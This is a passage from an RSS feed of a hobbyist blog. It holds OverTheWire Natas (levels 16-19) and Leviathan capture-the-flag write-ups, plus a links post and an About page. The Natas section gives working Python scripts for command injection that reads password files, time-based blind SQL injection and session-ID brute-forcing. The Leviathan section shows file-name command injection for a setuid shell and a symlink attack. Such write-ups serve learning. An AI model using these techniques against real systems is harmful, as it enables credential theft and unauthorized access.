&lt;p&gt;The only problem with this is that grep can only work on files. I also tried using &amp;laquo;&amp;lt; to have the char act as an input to grep, but for some strange reason I cannot get that to work. Whatever shell is used on the server seems to ignore it, despite the less-than sign not being explicitly filtered in the source code. No problem, we can just make a script to create a bunch of files on the server containing the chars. We have write access to the /tmp/ directory, so I&amp;rsquo;ve used the following script:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}

for i in range(1,33):
    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(echo $(cut -c {i} /etc/natas_webpass/natas17) &amp;gt; /tmp/char{i})&amp;quot;

        # Make the cURL request

    response = requests.post(url, auth=credentials, data=form_data)

    print(&amp;quot;Status code:&amp;quot;, response.status_code)
    print(&amp;quot;Content:&amp;quot;, response.text)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The end result is a bunch of files named &amp;ldquo;char&amp;rsquo;x&#39;&amp;rdquo; where x is the index of the string. Each file contains the char found at the corresponding index. Now we can use those files as input to grep.&lt;/p&gt;
&lt;p&gt;Again, it&amp;rsquo;s much faster to use a script than to manually run our grep command twice for each alpha char (50-60 times!). I&amp;rsquo;ve written this script which will run our new grep command in the form and pause on each guess to allow me to see the output and judge whether there was a match and write down the correct case of the char.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://natas16.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas16&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;needle&amp;quot;: &amp;quot;x&amp;quot;}

password = &amp;quot;xkeuche0sbnkbvh1ru7ksib9uulmi7sd&amp;quot;

for i in range(1,33):
    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1]} /tmp/char{i})&amp;quot;

    response = requests.post(url, auth=credentials, data=form_data)

    print(&amp;quot;Status code:&amp;quot;, response.status_code)
    print(&amp;quot;Content:&amp;quot;, response.text)
    print(f&amp;quot;current guess: {password[i-1]}&amp;quot;)
    wait = input()

    form_data[&amp;quot;needle&amp;quot;] = f&amp;quot;$(grep -o {password[i-1].upper()} /tmp/char{i})&amp;quot;

    response = requests.post(url, auth=credentials, data=form_data)

    print(&amp;quot;Status code:&amp;quot;, response.status_code)
    print(&amp;quot;Content:&amp;quot;, response.text)
    print(f&amp;quot;current guess: {password[i-1].upper()}&amp;quot;)
    wait = input()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I will not spoil the final password, but the script did allow me to get the correct case of each char and move on to the next level.&lt;/p&gt;
&lt;p&gt;This was the hardest level yet for sure. I kept coming back to it over the course of a couple weeks before I finally figured it out. It&amp;rsquo;s hard to say whether this was even close to the intended solution. I still wonder whether there was a way of escaping the quotes that I overlooked.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-17&#34;&gt;Level 17&lt;/h2&gt;
&lt;p&gt;This level has the same source code as level 15 except that it no longer let&amp;rsquo;s us know whether the user exists. Effectively this leaves us with no feedback to go on. To get around this, there is a MySQL function called &amp;ldquo;SLEEP()&amp;rdquo; that we can use. The sleep function can be used anywhere you would place a condition such as &amp;ldquo;username=&amp;rdquo;. The time it takes for the response to come back from the server can indicate whether the sleep function was used. So if we order the SQL server to sleep when we make a correct guess (refer to level15 above) then the response time will provide a signal for the script to save that character.&lt;/p&gt;
&lt;p&gt;It stands to reason that we can just take the script from Level 15 and tweak it a bit, since the problem is largely the same.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
import requests

url = &amp;quot;http://natas17.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas17&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;username&amp;quot;: &amp;quot;x&amp;quot;}
password=&amp;quot;&amp;quot;

alphanumeric_chars = [
&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;,
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;,
&#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;,
&#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;,
&#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;,
&#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;,
&#39;y&#39;, &#39;z&#39;
]

for i in range(1, 33):
    for j in alphanumeric_chars:
        form_data[&amp;quot;username&amp;quot;] = f&amp;quot;natas18\&amp;quot; AND ASCII(SUBSTRING(password, {i}, 1)) = {ord(j)} AND SLEEP(5) #&amp;quot;
  
        # make curl request and measure elapsed time
        start = time.time()
        response = requests.post(url, auth=credentials, data=form_data)
        end = time.time()
        
        if (end-start) &amp;gt; 5:
            password += j
            print(f&amp;quot;index: {i}\nguess: {j}&amp;quot;)
            print(&amp;quot;Status code:&amp;quot;, response.status_code)
            print(&amp;quot;Response time:&amp;quot;, str(round(end-start, 2)) +&amp;quot;s&amp;quot;)
            print(f&amp;quot;Password: {password}&amp;quot;)
            break
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h2 id=&#34;level-18&#34;&gt;Level 18&lt;/h2&gt;
&lt;p&gt;This level has a login form. It states that you need to login as admin to get the credentials to the next level. Looking at the source code, the actual login box essentially does nothing. It instead relies on PHP session ID for authentication. The max possible ID is 640. I plotted the program&amp;rsquo;s flow on a chart to get a better understanding.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/natas18-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;I couldn&amp;rsquo;t really find any way to exploit this, but it occurred to me that there is likely an ID which already has its admin flag set to 1. With such a low number of possible IDs, I could easily bruteforce the session ID to find an admin session. Here is a script I created to do just that:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://natas18.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas18&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;debug&amp;quot;: &amp;quot;&amp;quot;}
cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}

for i in range(1, 640):
        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = str(i)
        response = requests.get(url, cookies=cookie_data, auth=credentials, data=form_data)
        print(response.text)
        print(&amp;quot;guess:&amp;quot;, i)
        if &amp;quot;Password&amp;quot; in response.text:

            break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sure enough, one particular ID granted the password.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-19&#34;&gt;Level 19&lt;/h2&gt;
&lt;p&gt;Similarly, this level is looking for you to login using a PHPSESSID, but this time the IDs are &amp;ldquo;not sequential&amp;rdquo; according to the page.&lt;/p&gt;
&lt;p&gt;Clicking the login button with no credentials gives us a PHPSESSID of a seemingly random hex string always ending with 2d (a hyphen).&lt;/p&gt;
&lt;p&gt;After running a script to automate this hundreds of times I have confirmed that the same ID range is still in use&amp;ndash;1 to 640. The id is simply converted to it&amp;rsquo;s hex ascii value. So for example, instead of seeing 250, we see 3235302d.&lt;/p&gt;
&lt;p&gt;If we now login with a username, we get back a longer cookie. This time it will again be the same random id with a hyphen, but added onto the end is a hex ascii representation of the username typed in.&lt;/p&gt;
&lt;p&gt;Using a password does nothing, which tells me that the password is not implemented at all, most likely.&lt;/p&gt;
&lt;p&gt;So since we need to login as admin, we can be sure that the suffix of the cookie needs to be &amp;ldquo;61646d696e&amp;rdquo;. Then we can just try using all 640 possible values with the admin suffix added at the end until one of them works. Here&amp;rsquo;s the script I used for that:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests

url = &amp;quot;http://natas19.natas.labs.overthewire.org&amp;quot;
credentials = (&amp;quot;natas19&amp;quot;, &amp;quot;{censored}&amp;quot;)
form_data = {&amp;quot;username&amp;quot;: &amp;quot;&amp;quot;, &amp;quot;password&amp;quot;: &amp;quot;&amp;quot;}
cookie_data = {&amp;quot;PHPSESSID&amp;quot;: &amp;quot;x&amp;quot;}
  
for i in range(1, 640):
        # convert id to hex and append &amp;quot;admin&amp;quot; suffix
        cookie_data[&amp;quot;PHPSESSID&amp;quot;] = &amp;quot;&amp;quot;
        for j in str(i):
              cookie_data[&amp;quot;PHPSESSID&amp;quot;] += hex(ord(j)).lstrip(&amp;quot;0x&amp;quot;)
        cookie_data[&amp;quot;PHPSESSID&amp;quot;] += &amp;quot;2d61646d696e&amp;quot;
        
        response = requests.post(url, cookies=cookie_data, auth=credentials, data=form_data)
        print(response.text)
        print(&amp;quot;guess:&amp;quot;, i, &amp;quot;|&amp;quot;, cookie_data[&amp;quot;PHPSESSID&amp;quot;])

        if &amp;quot;You are logged in as a regular user.&amp;quot; not in response.text:
            break
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I was able to get the password to natas20 by running this script.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-20&#34;&gt;Level 20&lt;/h2&gt;
&lt;p&gt;(coming soon)&lt;/p&gt;
- https://koolaidxk1d.github.io/posts/natas/ - </description>
        </item>
    
    
    
        <item>
        <title>Cool Links</title>
        <link>https://koolaidxk1d.github.io/posts/links/</link>
        <pubDate>Wed, 21 Jun 2023 18:16:22 -0400</pubDate>
        
        <guid>https://koolaidxk1d.github.io/posts/links/</guid>
        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/links/ -&lt;p&gt;&lt;a href=&#34;https://based.cooking/&#34;&gt;https://based.cooking/&lt;/a&gt; - simple recipe website without the web bloat&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://superuser.com/a/1491153&#34;&gt;https://superuser.com/a/1491153&lt;/a&gt; - using angle bracket redirects&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://slipfox.xyz&#34;&gt;https://slipfox.xyz&lt;/a&gt; - free uploads, link shortening, and way more&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://teachyourselfcs.com/&#34;&gt;https://teachyourselfcs.com/&lt;/a&gt; - roadmap for self-taught CS education&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.xyz/&#34;&gt;https://book.hacktricks.xyz/&lt;/a&gt; - wiki with some useful info&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://cheatsheetseries.owasp.org/index.html&#34;&gt;https://cheatsheetseries.owasp.org/index.html&lt;/a&gt; - OWASP Cheat Sheets&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://evoxt.com/&#34;&gt;https://evoxt.com/&lt;/a&gt; - cheap VPS, good customer support&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://new.reddit.com/r/hacking/wiki/index/&#34;&gt;https://new.reddit.com/r/hacking/wiki/index/&lt;/a&gt; - good resources listed here&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;https://gchq.github.io/CyberChef/&lt;/a&gt; - Extremely useful all-in-one hacking web tool&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://dogbolt.org&#34;&gt;https://dogbolt.org&lt;/a&gt; - Online decompiler&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://redtiger.labs.overthewire.org/&#34;&gt;http://redtiger.labs.overthewire.org/&lt;/a&gt; - SQL Injection Lab (not listed on OTW) (possibly more unindexed labs can be found thru google)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://justbeamit.com/&#34;&gt;https://justbeamit.com/&lt;/a&gt; - P2P direct file transfer, drag n drop, no sign up&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.tumbig.com/&#34;&gt;https://www.tumbig.com/&lt;/a&gt; - gifs and stuff&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://quickref.me/&#34;&gt;https://quickref.me/&lt;/a&gt; - cheat sheets for everything imaginable&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://devmanual.gentoo.org/tools-reference/bash/index.html&#34;&gt;https://devmanual.gentoo.org/tools-reference/bash/index.html&lt;/a&gt; - bash reference guide&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://doesitarm.com/&#34;&gt;https://doesitarm.com/&lt;/a&gt; - check applications for native ARM support&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://armconverter.com/decryptedappstore&#34;&gt;https://armconverter.com/decryptedappstore&lt;/a&gt; - get basically any iOS IPA&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://img.doerig.dev/&#34;&gt;https://img.doerig.dev/&lt;/a&gt; - instant imgur upload&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://flowchart.fun/&#34;&gt;https://flowchart.fun/&lt;/a&gt; - &lt;a href=&#34;https://github.com/tone-row/flowchart-fun&#34;&gt;https://github.com/tone-row/flowchart-fun&lt;/a&gt; - Easy typed flowchart maker (for plotting out program flow)&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://draw.io/&#34;&gt;https://draw.io/&lt;/a&gt; - Another web based flowchart maker&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://processhacker.sourceforge.io/&#34;&gt;https://processhacker.sourceforge.io/&lt;/a&gt; - The task manager that Microshaft &lt;em&gt;should have&lt;/em&gt; given you.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://wiki.osdev.org/&#34;&gt;https://wiki.osdev.org/&lt;/a&gt; - Wiki for low-level stuff and how operating systems work&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://c9x.me/x86/&#34;&gt;https://c9x.me/x86/&lt;/a&gt; - x86 Instruction set listed for reference&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://12ft.io/&#34;&gt;https://12ft.io/&lt;/a&gt; - bypass article paywalls&lt;/p&gt;
- https://koolaidxk1d.github.io/posts/links/ - </description>
        </item>
    
    
    
        <item>
        <title>About Me</title>
        <link>https://koolaidxk1d.github.io/posts/about/</link>
        <pubDate>Wed, 31 May 2023 19:30:02 -0400</pubDate>
        
        <guid>https://koolaidxk1d.github.io/posts/about/</guid>
        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/about/ -&lt;p&gt;Y2K zoomer interested in offensive security. No professional experience &amp;hellip; yet.&lt;/p&gt;
&lt;p&gt;The purpose of my blog is to &lt;a href=&#34;https://www.swyx.io/learn-in-public&#34;&gt;learn in public&lt;/a&gt;. Hopefully by writing these posts I can not only help myself but possibly help others who stumble upon them.&lt;/p&gt;
&lt;h2 id=&#34;thanks&#34;&gt;Thanks&lt;/h2&gt;
&lt;p&gt;This blog is written with &lt;a href=&#34;https://obsidian.md/&#34;&gt;Obsidian&lt;/a&gt;, compiled with &lt;a href=&#34;https://gohugo.io/&#34;&gt;Hugo&lt;/a&gt;, and hosted with &lt;a href=&#34;https://pages.github.com/&#34;&gt;Github pages&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The Hugo theme in use is &lt;a href=&#34;https://themes.gohugo.io/themes/hugo-theme-diary/&#34;&gt;Diary&lt;/a&gt;.&lt;/p&gt;
- https://koolaidxk1d.github.io/posts/about/ - </description>
        </item>
    
    
    
        <item>
        <title>OverTheWire: Leviathan</title>
        <link>https://koolaidxk1d.github.io/posts/leviathan/</link>
        <pubDate>Sat, 27 May 2023 12:36:33 -0400</pubDate>
        
        <guid>https://koolaidxk1d.github.io/posts/leviathan/</guid>
        <description>koolaidxk1d https://koolaidxk1d.github.io/posts/leviathan/ -&lt;p&gt;OverTheWire&amp;rsquo;s Leviathan wargame is all about reverse engineering of x86 binaries. The description of the game states that it only requires knowledge of linux command line utilities, and little to no programming experience.&lt;/p&gt;
&lt;p&gt;Each level goes as such:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;You ssh into the server as the user whose password you obtained from the previous level.&lt;/li&gt;
&lt;li&gt;Through whatever means necessary, you get the password to the next level.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;There are no hints given for any of the levels, so it is completely up to us to figure out what we are looking for.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s get started.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-0---backup&#34;&gt;Level 0 - ~/.backup&lt;/h2&gt;
&lt;p&gt;Logging in using the username as the password, we are met with a welcome screen. The first thing I always do is list all files in the home folder.&lt;/p&gt;
&lt;p&gt;We can see something unusual; a hidden folder is present called &amp;lsquo;.backup&amp;rsquo;. Within that, a bookmarks file.&lt;/p&gt;
&lt;p&gt;Just for kicks, lets try to grep out anything related to a password&amp;hellip;&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan0-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;!-- raw HTML omitted --&gt;
&lt;p&gt;&lt;em&gt;Well!&lt;/em&gt; That was easy! On to the next one.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-1---check&#34;&gt;Level 1 - ~/check&lt;/h2&gt;
&lt;p&gt;In this level we have only one thing in our home directory: a setuid binary called check.&lt;/p&gt;
&lt;p&gt;SetUID binaries are special executables that, when executed, run with the permissions of the user that owns the file. In this case, the file is owned by leviathan2.&lt;/p&gt;
&lt;p&gt;I know from previous wargames that passwords are usually stored in /etc/somewargame_pass/. If we can somehow get this executable to read out the password file for leviathan2, we can get to the next level.&lt;/p&gt;
&lt;p&gt;First, let&amp;rsquo;s run the program.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan1-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Hmm&amp;hellip;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;In order to learn more about what this file is doing, let&amp;rsquo;s open it in &lt;a href=&#34;https://github.com/NationalSecurityAgency/ghidra&#34;&gt;Ghidra&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan1-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Looking at the main function above, we can see that the program does the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Take input from the user.&lt;/li&gt;
&lt;li&gt;Strcmp the output against an array of characters stored in &amp;ldquo;local_28&amp;rdquo; (a seemingly arbitrary variable name given by ghidra during analysis)&lt;/li&gt;
&lt;li&gt;If the inputs match, then execute a shell under leviathan2&amp;rsquo;s UID&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Perfect. We need that shell to get the password to the next level. Looking at local_28, we see &amp;ldquo;\0xes&amp;rdquo; is stored there. Since we are in little-endian, we need to swap these bytes around, giving us &amp;ldquo;sex\0&amp;rdquo;. Ignoring the null character at the end, the password must then be &amp;ldquo;sex&amp;rdquo;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan1-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;And there we have it.&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-2---printfile&#34;&gt;Level 2 - ~/printfile&lt;/h2&gt;
&lt;p&gt;Again we begin with a setuid binary owned by the next level&amp;rsquo;s user.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan2-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;The program prints a file specified by the user at runtime. But strangely, this setuid binary, although owned by leviathan3, can&amp;rsquo;t access leviathan3&amp;rsquo;s password file.&lt;/p&gt;
&lt;p&gt;We will again use Ghidra to look into this.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan2-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ok, we can see that the program checks if a file is accessible to the current UID (leviathan2) before conditionally checking whether to set the uid to leviathan3.&lt;/p&gt;
&lt;p&gt;This explains why we were not able to print the file.&lt;/p&gt;
&lt;p&gt;There is something else here that is interesting, however. On line 25, we can see that a buffer, arbitrarily named &amp;ldquo;auStack_214&amp;rdquo;, is filled with the command which will run on line 29 after the setuid call. The formatted string uses the first parameter given by the user at runtime. There is no input validation being done by the program, which is a potential hole we can use to force the program to execute our own commands. This is sometimes called &lt;a href=&#34;https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html&#34;&gt;&amp;ldquo;command injection&amp;rdquo;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;But there is a catch.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The only way the system call will be made is if the parameter also matches a legitimate accessible file, given the conditional statement(s) at lines 23-24.&lt;/p&gt;
&lt;p&gt;How about we name a file after the command we need to run following &amp;ldquo;/bin/cat&amp;rdquo;? We can use the special character &amp;lsquo;&amp;amp;&amp;rsquo; to run another command directly after cat.&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s touch the file &lt;strong&gt;&#39;&amp;amp;sh&#39;&lt;/strong&gt; and try to use it as an input to printfile. This should give us a shell running under leviathan3.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan2-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;There&amp;rsquo;s our password!&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Note: There are probably many other commands you could craft to achieve the same result. This is simply the first one I managed to think up.&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-3---level3&#34;&gt;Level 3 - ~/level3&lt;/h2&gt;
&lt;p&gt;Let&amp;rsquo;s ls the home folder&amp;hellip;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan3-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Ok, so this seems to just be another password obstacle. Following the flow of the main function brings us to this &amp;ldquo;do_stuff&amp;rdquo; function.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan3-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;On lines 22-23, the program is taking input from the user, putting it into the buffer &amp;ldquo;local_110&amp;rdquo;, and then comparing it to the  string starting at the address of &amp;ldquo;local_11b&amp;rdquo; to determine if the user is allowed to access the shell call made on line 28. So our question is, what is stored at local_11b?&lt;/p&gt;
&lt;p&gt;On lines 17-19 is our answer. These 3 variables are stored alongside each other in memory, and they contain &amp;ldquo;plns&amp;rdquo;, &amp;ldquo;tnir&amp;rdquo;, and &amp;ldquo;\nf&amp;rdquo;. Reversing these to big endian and concatenating them gives us &amp;ldquo;snlprintf\n&amp;rdquo;. Let&amp;rsquo;s try entering this as the password, omitting the newline character.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan3-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-4---trash&#34;&gt;Level 4 - ~/.trash&lt;/h2&gt;
&lt;p&gt;There&amp;rsquo;s a binary in the .trash folder. Let&amp;rsquo;s see what it gives us.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan4-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;11 bytes of binary. If we convert it to ASCII we get &amp;ldquo;EKKlTF1Xqs&amp;rdquo;. Looks like a password to me!&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-5---leviathan5&#34;&gt;Level 5 - ~/leviathan5&lt;/h2&gt;
&lt;p&gt;We are met with a binary in the home folder named after the user. It is another setuid executable.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan5-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;Weirdly, it asks for file.log in /tmp/, and it deletes the file if it exists. Obviously we will have to look under the hood. Here is the main function as analyzed by Ghidra:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan5-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So, we can see that the program first looks for a readable file at path /tmp/file.log. If it doesn&amp;rsquo;t exist, it closes out. Otherwise, it reads the file stream character by character. As long as the character is not an EOF (end-of-file indicator), then it puts said character out to the screen. After that it simply sets the uid back to the calling user (leviathan5 in this case), and unlinks the file it has just read, which the program rightly assumes was created by the calling user.&lt;/p&gt;
&lt;p&gt;Soooo, how can we abuse this?&lt;/p&gt;
&lt;p&gt;Well, since we just mentioned &amp;ldquo;unlink&amp;rdquo;, what is a link anyway?&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan5-2.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;So a link can be &amp;ldquo;acted upon by the user or application in exactly the same manner&amp;rdquo; as the file it is based upon. In other words, if I enact some command &amp;ndash; say &lt;em&gt;cat&lt;/em&gt; &amp;ndash; on a link of a file, I will get the same output as if I ran it on the file itself.&lt;/p&gt;
&lt;p&gt;You can probably see where this is going.  Symbolic links can be created in linux using the command ln -s, with the first argument being the target file, and the second argument being the desired link path.&lt;/p&gt;
&lt;p&gt;If we create a link to the leviathan_pass/leviathan6 file, we should then be able to essentially have a pointer to the password contents residing in /tmp/file.log.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan5-3.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-6---leviathan6&#34;&gt;Level 6 - ~/leviathan6&lt;/h2&gt;
&lt;p&gt;This one is &lt;em&gt;surprisingly easy.&lt;/em&gt; I&amp;rsquo;ll just let the decompiled C code speak for itself.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan6-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;p&gt;And here is how I obtain the password.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan6-1.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;level-7---the-end&#34;&gt;Level 7 - The end&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://koolaidxk1d.github.io/images/leviathan7-0.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;I&amp;rsquo;ve learned quite a lot about binaries through playing this game. I&amp;rsquo;m still intrigued and confused by system and function calls. I&amp;rsquo;m excited to begin the next OTW game in the very near future. It felt a bit like cheating using Ghidra&amp;rsquo;s decompiler. I&amp;rsquo;m not sure if I was intended to look at raw assembly or not. Maybe there is no cheating. I guess I will find out later down the road.&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s all for this one :)&lt;/p&gt;
- https://koolaidxk1d.github.io/posts/leviathan/ - </description>
        </item>
    
    
  </channel>
</rss> 